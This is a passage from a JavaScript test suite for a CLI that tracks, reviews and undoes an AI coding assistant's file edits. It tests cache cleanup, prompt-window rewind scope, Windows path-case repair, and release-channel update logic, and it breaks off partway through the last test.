test('cli: clean reaches the GC blind spots — ghost cache dirs, orphaned cursors, dead blob-memo (0.9.0)', () => {
  const home = freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const root = core.rootDir();
  // 1. a changemap-cache dir whose session has NO store dir: the store-id loop never visits it, so its
  //    superseded-version payloads survived every GC (27 found on a real store). The LIVE-version file
  //    must survive — a transcript-only session's warm cache is a working cache, not garbage.
  const cd = path.join(root, 'changemap-cache', 'ghostSess');
  fs.mkdirSync(cd, { recursive: true });
  fs.writeFileSync(path.join(cd, '0123456789abcdef.json'), JSON.stringify({ stamp: '1|old', map: {} }));
  // The live version comes from the product, not a literal: hardcoding it made this test fail on
  // the next legitimate MAP_CACHE_VERSION bump, which says nothing about whether clean works.
  fs.writeFileSync(path.join(cd, 'aaaabbbbccccdddd.json'), JSON.stringify({ stamp: core.MAP_CACHE_VERSION + '|live', map: {} }));
  // 2. usage cursors: filename is a one-way hash of the transcript path, unreachable from any session id.
  const uc = path.join(root, 'usage-cursors');
  fs.mkdirSync(uc, { recursive: true });
  fs.writeFileSync(path.join(uc, 'dead00.json'), JSON.stringify({ v: 1, transcript: '/no/such/file.jsonl', seen: [] }));
  const liveT = path.join(home, 'live.jsonl');
  fs.writeFileSync(liveT, '');
  fs.writeFileSync(path.join(uc, 'live00.json'), JSON.stringify({ v: 1, transcript: liveT, seen: [] }));
  fs.writeFileSync(path.join(uc, 'legacy.json'), JSON.stringify({ v: 1, seen: [] })); // path-less old format
  const old = (Date.now() - 40 * 24 * 3600e3) / 1000;
  fs.utimesSync(path.join(uc, 'legacy.json'), old, old);
  // 3. the artifact no released build ever read.
  fs.writeFileSync(path.join(root, 'blob-memo.json'), 'x'.repeat(1000));

  const out = JSON.parse(cp.execFileSync('node', [CLI, 'clean', '--json'], { env: { ...process.env, HOME: home, USERPROFILE: home }, encoding: 'utf8' }));
  assert.equal(out.staleMaps, 1, 'the ghost dir’s superseded payload is reaped');
  assert.equal(out.cursors, 2, 'the dead-path cursor and the aged path-less one are reaped');
  assert.ok(!fs.existsSync(path.join(cd, '0123456789abcdef.json')), 'superseded version gone');
  assert.ok(fs.existsSync(path.join(cd, 'aaaabbbbccccdddd.json')), 'live version kept');
  assert.ok(fs.existsSync(path.join(uc, 'live00.json')), 'a cursor whose transcript exists is never touched');
  assert.ok(!fs.existsSync(path.join(root, 'blob-memo.json')), 'blob-memo dropped');
  // Scoped clean must NOT sweep the blind spots: `--session x` names one session's store, and machine-
  // wide reaping on a scoped call would surprise exactly the caller who asked for the narrow thing.
  fs.writeFileSync(path.join(root, 'blob-memo.json'), 'y');
  core.ensureStore('scopedS');
  cp.execFileSync('node', [CLI, 'clean', '--session', 'scopedS', '--json'], { env: { ...process.env, HOME: home, USERPROFILE: home }, encoding: 'utf8' });
  assert.ok(fs.existsSync(path.join(root, 'blob-memo.json')), 'a scoped clean leaves the machine-wide sweeps alone');
});

test('actions: outsideCounts — memoized boundary-crossing counts stay exact (0.9.0)', () => {
  const home = freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const ws = fs.realpathSync(tmpWork());
  const S = 'outCounts';
  const proj = core.projectDir(ws);
  fs.mkdirSync(proj, { recursive: true });
  const tp = path.join(proj, S + '.jsonl');
  const use = (name, input) => JSON.stringify({ timestamp: new Date(1000).toISOString(), type: 'assistant', message: { role: 'assistant', id: 'a' + Math.random(), content: [{ type: 'tool_use', id: 't' + Math.random(), name, input }] } });
  // ASYMMETRIC on purpose: 2 outside reads + 1 outside write — the asymmetry is the built-in positive
  // control, so a reads/writes swap cannot pass.
  fs.writeFileSync(tp, [
    use('Read', { file_path: path.join(home, 'outside-a.txt') }),
    use('Read', { file_path: path.join(home, 'outside-b.txt') }),
    use('Edit', { file_path: path.join(home, 'outside-c.txt'), old_string: 'x', new_string: 'y' }),
    use('Read', { file_path: path.join(ws, 'inside.txt') }), // inside the worktree — counted by neither
  ].join('\n') + '\n');
  core.ensureStore(S);
  assert.deepEqual(core.outsideCounts(ws, S), { reads: 2, writes: 1 }, 'counts match the transcript, not each other');
  // The stamp must cover the TRANSCRIPT: append one more outside write and the memo must not serve the
  // stale pair (a finished session's numbers are permanent precisely because its transcript is).
  fs.appendFileSync(tp, use('Write', { file_path: path.join(home, 'outside-d.txt'), content: 'z' }) + '\n');
  assert.deepEqual(core.outsideCounts(ws, S), { reads: 2, writes: 2 }, 'a grown transcript recounts');
});

test('prompts: promptWindows owns edits by ask window, boundary to the NEWER ask (0.9.0)', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const cwd = fs.realpathSync(tmpWork());
  const S = 'pwOwner';
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const line = (ts, o) => JSON.stringify({ timestamp: new Date(ts).toISOString(), ...o });
  fs.writeFileSync(path.join(proj, S + '.jsonl'), [
    line(1000, { type: 'user', message: { role: 'user', content: 'first ask' } }),
    line(5000, { type: 'user', message: { role: 'user', content: 'second ask' } }),
    line(5100, { type: 'assistant', message: { role: 'assistant', id: 'a1', content: [{ type: 'text', text: 'ok' }] } }),
  ].join('\n') + '\n');
  // Three pending edits in DISTINCT files (so reviewEdits collapses nothing): before any ask, inside
  // ask 1, and exactly AT ask 2's timestamp — the boundary that pins the binary search.
  const mk = (ts, f) => { core.ensureStore(S); const b = core.writeBlob(S, Buffer.from('a\n')); const a = core.writeBlob(S, Buffer.from('b\n')); const id = core.nextId(S); core.appendLog(S, { id, ts, tool: 'Edit', file: path.join(cwd, f), beforeBlob: b, afterBlob: a, status: 'pending' }); return id; };
  mk(500, 'pre.ts');
  const mid = mk(2000, 'mid.ts');
  const edge = mk(5000, 'edge.ts');
  const w = core.promptWindows(cwd, S);
  assert.equal(w.length, 2, 'two asks, two windows');
  assert.deepEqual(w[0].editIds, [mid], 'ask 1 owns only the edit inside its window — the pre-ask edit belongs to nobody');
  assert.deepEqual(w[1].editIds, [edge], 'an edit stamped at an ask’s own ts belongs to the NEW ask, not the old one');
  assert.deepEqual([w[0].pending, w[1].pending], [1, 1], 'pending rides each window');
  // Positive control for the status overlay: keep the mid edit; its id stays owned, pending drops.
  core.setStatus(S, mid, 'kept');
  const w2 = core.promptWindows(cwd, S);
  assert.deepEqual(w2[0].editIds, [mid], 'a kept edit is still owned by its ask');
  assert.equal(w2[0].pending, 0, 'and no longer pending');
});

test('prompts: checkpointScope is the rewind boundary — group-expanded, ts-bounded, two honest counts (0.10.0)', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const cwd = fs.realpathSync(tmpWork());
  const S = 'ckpt';
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const line = (ts, o) => JSON.stringify({ timestamp: new Date(ts).toISOString(), ...o });
  // Three asks; seedEdit stamps ts = id*1000, so each ask lands between two edits.
  fs.writeFileSync(path.join(proj, S + '.jsonl'), [
    line(1500, { type: 'user', message: { role: 'user', content: 'ask one' } }),
    line(2500, { type: 'user', message: { role: 'user', content: 'ask two' } }),
    line(3500, { type: 'user', message: { role: 'user', content: 'ask three' } }),
  ].join('\n') + '\n');
  const PRE = path.join(cwd, 'pre.txt'), CHAIN = path.join(cwd, 'chain.txt'), LATER = path.join(cwd, 'later.txt');
  seedEdit(S, PRE, 'X\n', 'Y\n');                        // #1 ts1000 — before every ask
  seedEdit(S, CHAIN, 'L1\nA\nL3\n', 'L1\nB\nL3\n');      // #2 ts2000 — window 1
  seedEdit(S, CHAIN, 'L1\nB\nL3\n', 'L1\nC\nL3\n');      // #3 ts3000 — window 2, chains with #2
  seedEdit(S, LATER, 'P\n', 'Q\n');                      // #4 ts4000 — window 3
  const w = core.promptWindows(cwd, S);
  assert.equal(w.length, 3, 'three asks, three windows');
  // #2 and #3 touch the SAME line of the same file and chain perfectly — but they belong to different
  // asks, and a review unit never spans two. That boundary is doing two jobs at once:
  //
  //  - every ask reports the work it caused. Merging these put both edits under #3's window and left
  //    window 1 printing zero for an edit it made, which is what would render a per-ask review surface
  //    blank for most of a session.
  //  - a rewind from ask 2 no longer reverts an edit ask 1 made. Group expansion used to drag #2 in
  //    through the back door, widening the blast radius past what the reader picked.
  //
  // Within one ask they would still combine; across asks the honest answer is two decisions, each with
  // its own exact before→after pair.
  assert.deepEqual(core.groupMembers(S, 3), [3], 'a unit does not cross an ask boundary');
  assert.deepEqual(core.groupMembers(S, 2), [2]);
  assert.deepEqual(w[0].editIds, [2], 'window 1 reports its own edit');
  assert.deepEqual(w[1].editIds, [3], 'window 2 reports its own');

  const sc = core.checkpointScope(cwd, S, '2');
  assert.deepEqual(sc.ids, [3, 4], 'rewinding from ask 2 takes ask 2 onward, and nothing ask 1 did');
  assert.equal(sc.pending, 2, 'two raw records would actually revert');
  assert.equal(sc.units, 2, '…which the rows count as two review units');
  assert.equal(sc.units, w[1].pending + w[2].pending, 'and that unit count is exactly what those rows print');
  assert.deepEqual(sc.files.map((f) => path.basename(f)).sort(), ['chain.txt', 'later.txt'], 'files come from the pending records');
  assert.deepEqual(core.checkpointScope(cwd, S, w[1].id).ids, sc.ids, 'the stable hash id resolves the same window as the index');

  // The boundary really is a boundary, and the pre-ask edit belongs to no rewind at all.
  assert.deepEqual(core.checkpointScope(cwd, S, '3').ids, [4], 'rewinding from ask 3 leaves earlier windows alone');
  assert.ok(!core.checkpointScope(cwd, S, '1').ids.includes(1), 'an edit older than the first ask precedes every boundary, so no rewind owns it');
  // The unassigned guard's whole point: nothing at or after the boundary may be silently skipped.
  const atOrAfter = core.reviewEdits(S).filter((r) => r.ts >= w[1].ts).map((r) => r.id);
  assert.ok(atOrAfter.length > 0 && atOrAfter.every((id) => sc.ids.includes(id)), 'every display record at or after the boundary is in scope');
  assert.deepEqual(core.checkpointScope(cwd, S, 'nope'), { ids: [], pending: 0, units: 0, fromEarlier: 0, files: [] }, 'an unknown prompt is an empty scope, not a throw');

  // Resolving the chain removes it from the scope's COUNTS while its ids stay addressable for redo.
  core.keepGroup(S, 3);
  assert.equal(core.findRecord(S, 2).status, 'pending', "keeping ask 2's unit leaves ask 1's edit alone");
  const after = core.checkpointScope(cwd, S, '2');
  assert.deepEqual(after.ids, [3, 4], 'kept ids are still in scope (redo --from-prompt needs them)');
  assert.equal(after.pending, 1, 'but only the still-pending record would revert');
  assert.equal(after.units, 1, 'and it is one unit');
  assert.deepEqual(after.files.map((f) => path.basename(f)), ['later.txt'], 'the kept file drops out of the file list');
});

test('store: Windows drive-letter case — phantoms are healed, repaired, and undo-proofed (#43)', () => {
  freshHome();
  const S = 'caseSess';
  core.ensureStore(S);
  // canonPath is a pure transform, so the same assertions run on every CI OS.
  assert.equal(core.canonPath('c:\\repo\\x.ts'), 'C:\\repo\\x.ts', 'lowercase drive is uppercased');
  assert.equal(core.canonPath('C:/repo/x.ts'), 'C:/repo/x.ts', 'already-canonical stays');
  assert.equal(core.canonPath('/unix/path'), '/unix/path', 'POSIX paths untouched');
  assert.equal(core.canonPath('cargo.toml'), 'cargo.toml', 'a bare name with no drive is untouched');

  const blob = (txt) => core.writeBlob(S, Buffer.from(txt));
  const add = (file, before, after) => {
    const id = core.nextId(S);
    core.appendLog(S, { id, ts: id * 1000, tool: 'Bash', file, beforeBlob: before, afterBlob: after, status: 'pending' });
    return id;
  };
  // The issue's exact shape: one file, two cases — a phantom create and its delete twin.
  const A = blob('the untouched file\ncontents\n');
  const phantomCreate = add('C:\\repo\\ci.yml', null, A);
  const phantomDelete = add('c:\\repo\\ci.yml', A, null);
  // A LEGITIMATE create-then-delete of a temp file — one consistent path. The repair must keep it.
  const B = blob('temp\n');
  const legitCreate = add('C:\\repo\\tmp.txt', null, B);
  const legitDelete = add('C:\\repo\\tmp.txt', B, null);
  // And one real pending edit that must survive everything.
  const realEdit = add('C:\\repo\\real.ts', blob('a\n'), blob('b\n'));

  // 1. READ-SIDE HEAL: both phantom records surface under ONE canonical file.
  const files = new Set(core.readLog(S).map((r) => r.file));
  assert.ok(files.has('C:\\repo\\ci.yml') && !files.has('c:\\repo\\ci.yml'),
    'readLog serves one canonical path for the case twins');

  // 2. REPAIR: exactly the case-differing pair goes; the legit pair and the real edit stay.
  const r = core.repairCasePhantoms(S);
  assert.deepEqual(r, { pairs: 1, ids: [phantomCreate, phantomDelete].sort((a, b) => a - b) },
    'one provable pair found — raw-case difference is the discriminator');
  const left = core.readLog(S).map((x) => x.id).sort((a, b) => a - b);
  assert.deepEqual(left, [legitCreate, legitDelete, realEdit].sort((a, b) => a - b),
    'the same-case create+delete pair and the real edit are untouched');
  assert.equal(core.repairCasePhantoms(S).pairs, 0, 'a second repair finds nothing (idempotent)');
});

test('undo: the phantom guard is STRICT — a same-raw-path create+delete chain keeps ordinary undo semantics (#43)', () => {
  // The guard refuses only PROVABLE phantoms: the create and its delete-twin must disagree in RAW
  // path case (repairCasePhantoms' own discriminator). A genuine create→delete→re-create chain on
  // ONE consistent path (stash/checkout flows produce it) must not be misdiagnosed as a phantom and
  // pointed at a repair that would then find nothing. The refusal itself needs a real case-twin pair
  // with the file on disk, which only a Windows path can be — exercised end-to-end by the win32 test.
  freshHome();
  const S = 'caseUndo';
  const work = fs.realpathSync(tmpWork());
  core.ensureStore(S);
  const target = path.join(work, 'made-and-remade.txt');
  fs.writeFileSync(target, 'same bytes\n');
  const A = core.writeBlob(S, fs.readFileSync(target));
  const mk = (file, before, after) => { const id = core.nextId(S); core.appendLog(S, { id, ts: id * 1000, tool: 'Bash', file, beforeBlob: before, afterBlob: after, status: 'pending' }); return id; };
  const create = mk(target, null, A);
  mk(target, A, null); // same RAW path — NOT a provable phantom
  const res = core.undoEdit(S, create);
  assert.equal(res.ok, true, 'no phantom misdiagnosis on one consistent raw path');
  assert.ok(!fs.existsSync(target), 'the ordinary create-undo semantics hold (content matches → delete)');
  // Positive control for the guard's other gate: with no file on disk, a create-undo is a no-op success.
  const ghost = mk(path.join(work, 'never-on-disk.txt'), null, core.writeBlob(S, Buffer.from('tmp\n')));
  assert.equal(core.undoEdit(S, ghost).ok, true, 'a create whose file is gone undoes harmlessly');
});

test('cli: clean --phantoms wiring — removes a provable pair; a log-less session reports zero, not ENOENT (#43)', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const home = process.env.HOME;
  const env = { ...process.env, HOME: home, USERPROFILE: home };
  delete env.CLAUDE_OBSERVATORY_SESSION;
  const S = 'phWire';
  core.ensureStore(S);
  const blob = core.writeBlob(S, Buffer.from('x\n'));
  const mk = (file, before, after) => { const id = core.nextId(S); core.appendLog(S, { id, ts: id * 1000, tool: 'Bash', file, beforeBlob: before, afterBlob: after, status: 'pending' }); return id; };
  mk('C:\\repo\\ci.yml', null, blob);
  mk('c:\\repo\\ci.yml', blob, null);
  const runJson = (args) => JSON.parse(cp.execFileSync('node', [CLI, ...args], { env, encoding: 'utf8' }));
  assert.equal(runJson(['clean', '--phantoms', '--session', S, '--json']).pairs, 1, 'the flag reaches repairCasePhantoms');
  // A session that never captured (no log.jsonl at all): zero pairs and a clean exit — the undo
  // guard's error message names this command, so it must never die on ENOENT where it sends people.
  assert.equal(runJson(['clean', '--phantoms', '--session', 'never-captured', '--json']).pairs, 0, 'no log → zero pairs, not a crash');
});

test('scope: isUnderPath canonicalizes BOTH operands (#43)', () => {
  // EXACT-FILE scope is separator-free, so the canon is assertable on every CI OS. (FOLDER scope
  // splices the RUNTIME path.sep, so Windows folder prefixes only match on win32 — covered by the
  // win32-gated CLI test below.)
  assert.ok(core.isUnderPath('C:\\repo\\x.ts', 'c:\\repo\\x.ts'), 'exact-file scope with a lower-cased drive matches');
  assert.ok(core.isUnderPath('c:\\repo\\x.ts', 'C:\\repo\\x.ts'), 'a lower-cased record side is canonicalized too');
  assert.ok(!core.isUnderPath('C:\\repo\\x.ts', 'c:\\other\\x.ts'), 'a non-matching scope still refuses (positive control)');
  // FOLDER scope splices the RUNTIME path.sep, so assert it with native paths — POSIX literals here
  // failed on windows-latest ('/w/src' + '\\' matches nothing), the mirror of the trap above.
  const root = path.join('w', 'src');
  assert.ok(core.isUnderPath(path.join(root, 'a.ts'), root), 'native folder scope');
  assert.ok(!core.isUnderPath(path.join('w', 'srcx', 'a.ts'), root), 'native sibling prefix still refuses');
});

test('cli: list --file and keep --under canonicalize their operands (#43)', () => {
  // Platform-independent half: records with FAKE canonical Windows paths, read-only `list --file`
  // (keep/undo would try to touch C:\ paths on a POSIX runner, so the write half is win32-gated below).
  const home = freshHome();
  delete process.env.CLAUDE_CONFIG_DIR; // the in-process store writes must land in the fake HOME too
  const env = { ...process.env, HOME: home, USERPROFILE: home };
  delete env.CLAUDE_OBSERVATORY_SESSION;
  const S = 'cliCase';
  core.ensureStore(S);
  const id = core.nextId(S);
  core.appendLog(S, {
    id, ts: 1000, tool: 'Edit', file: 'C:\\repo\\src\\mod.ts',
    beforeBlob: core.writeBlob(S, Buffer.from('a\n')), afterBlob: core.writeBlob(S, Buffer.from('b\n')), status: 'pending',
  });
  const runJson = (args) => JSON.parse(cp.execFileSync('node', [CLI, ...args], { env, encoding: 'utf8' }));
  const hit = runJson(['list', '--session', S, '--file', 'c:\\repo\\src', '--json']);
  assert.equal(hit.edits.length, 1, 'a lower-cased --file substring matches the canonical record');
  const miss = runJson(['list', '--session', S, '--file', 'c:\\other', '--json']);
  assert.equal(miss.edits.length, 0, 'a non-matching substring still matches nothing (positive control)');
  const kept = runJson(['keep', '--session', S, '--file', 'c:\\repo\\src', '--json']);
  assert.equal(kept.kept, 1, 'keep --file canonicalizes its substring the same way');
});

test('cli(win32): lower-cased drive operands work end-to-end — list, keep --under, locate', { skip: process.platform !== 'win32' }, () => {
  // REAL paths on the Windows runner: C:\Users\... — lower-case the drive letter in every operand,
  // exactly what a Git Bash shell or an editor hands over. Runs only on windows-latest CI.
  const home = freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const env = { ...process.env, HOME: home, USERPROFILE: home };
  delete env.CLAUDE_OBSERVATORY_SESSION;
  const S = 'cliWin';
  core.ensureStore(S);
  const work = fs.realpathSync(tmpWork());
  const target = path.join(work, 'mod.ts');
  fs.writeFileSync(target, 'b\n');
  const canonical = core.canonPath(target);
  assert.notEqual(canonical, canonical[0].toLowerCase() + canonical.slice(1), 'the runner path is drive-shaped');
  const id = core.nextId(S);
  core.appendLog(S, {
    id, ts: 1000, tool: 'Edit', file: canonical,
    beforeBlob: core.writeBlob(S, Buffer.from('a\n')), afterBlob: core.writeBlob(S, Buffer.from('b\n')), status: 'pending',
  });
  const lower = (p) => p[0].toLowerCase() + p.slice(1);
  assert.ok(core.isUnderPath(canonical, lower(work)), 'isUnderPath folder scope through a lower-cased drive (win32 sep)');
  const run = (args, input) => cp.execFileSync('node', [CLI, ...args], { env, encoding: 'utf8', ...(input === undefined ? {} : { input }) });
  const runJson = (args, input) => JSON.parse(run(args, input));
  assert.equal(runJson(['list', '--session', S, '--file', lower(target), '--json']).edits.length, 1, 'list --file');
  const loc = runJson(['locate', '--session', S, '--file', lower(target), '--json'], 'b\n');
  assert.equal(loc.placements.length, 1, 'locate --file finds the pending edit through a lower-cased drive');
  const kept = runJson(['keep', '--session', S, '--under', lower(work), '--json']);
  assert.equal(kept.kept, 1, 'keep --under scopes through a lower-cased drive');

  // The REAL #43 shape end-to-end: one file, two RAW drive cases, the file on disk. Both undo paths
  // must refuse, the bulk revert must SAY so, and the named repair must remove the pair.
  const phTarget = path.join(work, 'phantom.txt');
  fs.writeFileSync(phTarget, 'untouched\n');
  const P = core.writeBlob(S, fs.readFileSync(phTarget));
  const mk = (file, before, after) => { const pid = core.nextId(S); core.appendLog(S, { id: pid, ts: pid * 1000, tool: 'Bash', file, beforeBlob: before, afterBlob: after, status: 'pending' }); return pid; };
  const create = mk(core.canonPath(phTarget), null, P);
  mk(lower(core.canonPath(phTarget)), P, null); // the delete-twin under the OTHER raw case
  assert.equal(core.undoEdit(S, create).ok, false, 'undoEdit refuses the provable phantom');
  assert.equal(core.restoreFile(S, create).ok, false, 'the --force path refuses it too');
  assert.ok(fs.existsSync(phTarget), 'the untouched file survives both undo paths');
  const scope = core.undoScope(S, { under: lower(work) });
  assert.ok(scope.errors >= 1 && /phantom/.test(scope.firstError ?? ''), 'bulk revert counts and names the refusal');
  assert.equal(runJson(['clean', '--phantoms', '--session', S, '--json']).pairs, 1, 'clean --phantoms removes the pair');
});

test('install: statuslineInstalled detects OURS and only ours (0.9.0)', () => {
  const home = freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const dir = path.join(home, '.claude');
  fs.mkdirSync(dir, { recursive: true });
  assert.equal(core.statuslineInstalled(), false, 'nothing installed — false');
  fs.writeFileSync(path.join(dir, 'settings.json'), JSON.stringify({ statusLine: { type: 'command', command: `bash ${path.join(dir, 'statusline.sh')}` } }));
  assert.equal(core.statuslineInstalled(), false, 'settings point at a script that does not exist — false (never "refresh" onto nothing)');
  fs.writeFileSync(path.join(dir, 'statusline.sh'), '#!/bin/bash\n');
  assert.equal(core.statuslineInstalled(), true, 'settings + script — true');
  fs.writeFileSync(path.join(dir, 'settings.json'), JSON.stringify({ statusLine: { type: 'command', command: '/usr/local/bin/some-other-statusline' } }));
  assert.equal(core.statuslineInstalled(), false, 'a FOREIGN status line is never treated as ours');
  fs.writeFileSync(path.join(dir, 'settings.json'), JSON.stringify({ statusLine: { type: 'command', command: 'bash /home/u/tools/statusline.sh' } }));
  assert.equal(core.statuslineInstalled(), false, "someone else's statusline.sh at a foreign path is not ours — the match is the FULL config-dir path, and `update` must never overwrite it");
  fs.writeFileSync(path.join(dir, 'settings.json'), '{corrupt');
  assert.equal(core.statuslineInstalled(), false, 'corrupt settings — false, never a throw');
});

test('semver: prerelease ordering carries the release channels (0.9.0)', () => {
  assert.ok(core.isNewer('0.10.0-dev.2', '0.9.0'), 'a dev build is newer than the stable it forked from');
  assert.ok(core.isNewer('0.10.0', '0.10.0-dev.9'), 'the promoted stable is newer than every dev build before it');
  assert.ok(core.isNewer('0.10.0-dev.10', '0.10.0-dev.9'), 'dev builds order numerically, not lexically');
  assert.ok(!core.isNewer('0.10.0-dev.9', '0.10.0-dev.10'), 'and never the other way');
  assert.ok(!core.isNewer('0.10.0-dev.4', '0.10.0-dev.4'), 'equal prereleases are equal');
  assert.ok(core.isNewer('0.10.0-dev.2', '0.10.0-dev'), 'more identifiers beat a shared prefix');
  assert.equal(core.compareVersions('1.2.3', 'v1.2.3'), 0, 'the v prefix is cosmetic');
  assert.ok(core.isNewer('0.10.0', '0.9.9'), 'plain release ordering is unchanged');
});

test('channel: persisted at the store root; resolveReleaseFromList picks per channel (0.9.0)', () => {
  const home = freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  assert.equal(core.getUpdateChannel(), 'stable', 'no file → stable');
  core.setUpdateChannel('dev');
  assert.equal(core.getUpdateChannel(), 'dev', 'the switch persists');
  core.setUpdateChannel('stable');
  assert.equal(core.getUpdateChannel(), 'stable', 'and back');
  assert.equal(core.normalizeChannel('Pre-Release'), 'dev');
  assert.equal(core.normalizeChannel('prerelease'), 'dev');
  assert.equal(core.normalizeChannel('stable'), 'stable');
  assert.equal(core.normalizeChannel('nightly'), null, 'unknown spellings are refused, never guessed');

  const releases = [
    { tag_name: 'dev-latest', prerelease: true },
    { tag_name: 'v0.9.0', prerelease: false },
    { tag_name: 'v0.8.9', prerelease: false },
  ];
  assert.equal(core.resolveReleaseFromList(releases, 'stable').tag_name, 'v0.9.0', 'stable skips prereleases');
  assert.equal(core.resolveReleaseFromList(releases, 'dev').tag_name, 'dev-latest', 'dev takes the newest prerelease');
  assert.equal(core.resolveReleaseFromList([{ tag_name: 'v0.9.0' }], 'dev').tag_name, 'v0.9.0', 'dev falls back to stable when no prerelease exists');
  assert.equal(core.resolveReleaseFromList([{ tag_name: 'x', prerelease: false, draft: true }], 'stable'), null, 'drafts never resolve');

  // After a promote, the STABLE release outranks the last rolling build — the dev channel must
  // serve the newest thing, not blindly the newest prerelease.
  assert.equal(
    core.resolveReleaseFromList(
      [
        { tag_name: 'v0.10.0', prerelease: false },
        { tag_name: 'dev-latest', name: 'Pre-release 0.10.0-dev.9 (rolling, from dev)', prerelease: true },
      ],
      'dev'
    ).tag_name,
    'v0.10.0',
    'dev serves the stable when it semver-outranks the rolling build'
  );

  // versionOfRelease: the tag when version-shaped, else the semver in the title (the rolling tag).
  assert.equal(core.versionOfRelease({ tag_name: 'v0.9.0' }), '0.9.0', 'stable versions come from the tag');
  assert.equal(core.versionOfRelease({ tag_name: 'dev-latest', name: 'Pre-release 0.9.0-dev.12 (rolling, from dev)' }), '0.9.0-dev.12', 'the rolling tag versions from the title');
  assert.equal(core.versionOfRelease({ tag_name: 'dev-latest', name: 'no version here' }), null, 'no semver anywhere → null, never a fake 0.0.0');
  assert.equal(core.versionOfRelease(null), null, 'null-safe');

  // LOCKSTEP with the workflow: the rolling release's --title template in dev-release.yml must stay
  // extractable by versionOfRelease — if the title loses its version, the dev channel resolves to
  // nothing and no other test notices.
  const wf = fs.readFileSync(path.resolve(__dirname, '../../../.github/workflows/dev-release.yml'), 'utf8');
  const titles = [...wf.matchAll(/--title "([^"]+)"/g)].map((m) => m[1].replace(/\$\{VER\}/g, '9.9.9-dev.3'));
  assert.ok(titles.length >= 1, 'the workflow declares the rolling release title');
  for (const t of titles)
    assert.equal(core.versionOfRelease({ tag_name: 'dev-latest', name: t }), '9.9.9-dev.3',
      `versionOfRelease must extract the version from the workflow title: "${t}"`);

  // The CLI's network-free version surface — what the editors' chip renders instantly.
  const env = { ...process.env, HOME: home, USERPROFILE: home };
  const vj = JSON.parse(cp.execFileSync('node', [CLI, 'version', '--json'], { env, encoding: 'utf8' }));
  assert.deepEqual(vj, { current: require('../../cli/package.json').version, channel: 'stable' }, 'version --json = installed + channel, no network');
});

test('update: resolveUpdatePlan follows the channel in BOTH directions (0.9.5)', () => {
  const STABLE = { tag_name: 'v0.9.5', prerelease: false, assets: [{ name: 'claude-observatory-0.9.5.tgz' }] };
  const DEV = {
    tag_name: 'dev-latest',
    name: 'Pre-release 0.10.0-dev.12 (rolling, from dev)',
    prerelease: true,
    assets: [{ name: 'claude-observatory-vscode-dev.vsix' }],
  };
  const LIST = [STABLE, DEV];
  const at = (v) => [{ surface: 'vscode', label: 'VS Code', version: v }];
  const one = (plan) => plan.surfaces[0];

  // THE REPORTED BUG. A locally-built 0.10.0 sorts ABOVE every 0.10.0-dev.N the dev channel
  // publishes, so an isNewer gate called it "up to date" forever — on BOTH channels, silently.
  const stranded = core.resolveUpdatePlan(LIST, 'dev', at('0.10.0'));
  assert.equal(stranded.target, '0.10.0-dev.12', 'the dev channel targets its rolling build');
  assert.equal(one(stranded).reason, 'ahead', 'an install above the channel line is stranded, not current');
  assert.equal(stranded.actions.length, 1, 'and it is acted on — following a channel means matching it');

  const strandedOnStable = core.resolveUpdatePlan(LIST, 'stable', at('0.10.0'));
  assert.equal(strandedOnStable.target, '0.9.5');
  assert.equal(one(strandedOnStable).reason, 'ahead', 'the same install is stranded on stable too');

  // The ordinary case, and the switch back down — the direction isNewer could never express.
  assert.equal(one(core.resolveUpdatePlan(LIST, 'dev', at('0.10.0-dev.8'))).reason, 'behind');
  const down = core.resolveUpdatePlan(LIST, 'stable', at('0.10.0-dev.12'), { switching: true });
  assert.equal(down.target, '0.9.5');
  assert.equal(one(down).reason, 'ahead', 'dev → stable is a downgrade, and it still happens');

  // Nothing to do is its own answer, and a same-version channel switch still reinstalls so the bits
  // provably come from the channel the config now names.
  const current = core.resolveUpdatePlan(LIST, 'dev', at('0.10.0-dev.12'));
  assert.equal(one(current).reason, 'current');
  assert.equal(current.actions.length, 0, 'current surfaces produce no action');
  assert.equal(current.surfaces.length, 1, 'but they are still reported — "up to date" ≠ "not checked"');
  assert.equal(one(core.resolveUpdatePlan(LIST, 'dev', at('0.10.0-dev.12'), { switching: true })).reason, 'switching');
  assert.equal(one(core.resolveUpdatePlan(LIST, 'dev', at('0.10.0-dev.12'), { force: true })).reason, 'forced');
  assert.equal(one(core.resolveUpdatePlan(LIST, 'dev', at(null))).reason, 'missing', 'not installed is not "current"');

  // POST-PROMOTE: the chip used to take the newest prerelease directly while the updater used
  // resolveReleaseFromList, so the two named different versions. One resolution now, and it says so.
  const promoted = core.resolveUpdatePlan(
    [{ tag_name: 'v0.10.0', prerelease: false }, DEV],
    'dev',
    at('0.10.0-dev.12')
  );
  assert.equal(promoted.target, '0.10.0', 'dev serves the stable when it outranks the rolling build');
  assert.equal(promoted.degradedToStable, true, 'and the caller can say so instead of advertising a prerelease');
  assert.equal(one(promoted).reason, 'behind');

  // Every surface is decided by the same rule; a non-actionable one stays in the plan so the caller
  // can report it loudly rather than skipping in silence.
  const multi = core.resolveUpdatePlan(LIST, 'stable', [
    { surface: 'cli', label: 'CLI', version: '0.9.4' },
    { surface: 'vscode', label: 'Cursor', version: '0.9.5' },
    { surface: 'jetbrains', label: 'JetBrains', version: '0.9.1', actionable: false },
  ]);
  assert.deepEqual(multi.surfaces.map((s) => s.reason), ['behind', 'current', 'behind']);
  assert.deepEqual(multi.actions.map((a) => a.label), ['CLI', 'JetBrains']);
  assert.equal(multi.actions[1].actionable, false, 'installed but unactionable is carried, not dropped');

  // No usable release degrades to an empty plan, never to a fake target.
  const none = core.resolveUpdatePlan([{ tag_name: 'x', draft: true }], 'stable', at('0.9.4'));
  assert.equal(none.release, null);
  assert.equal(none.target, '');
  assert.deepEqual(none.actions, []);

  // Assets are matched by KIND, never by name — the two channels name them differently.
  assert.equal(core.assetFor(DEV.assets, 'vscode').name, 'claude-observatory-vscode-dev.vsix');
  assert.equal(core.assetFor(STABLE.assets, 'cli').name, 'claude-observatory-0.9.5.tgz');
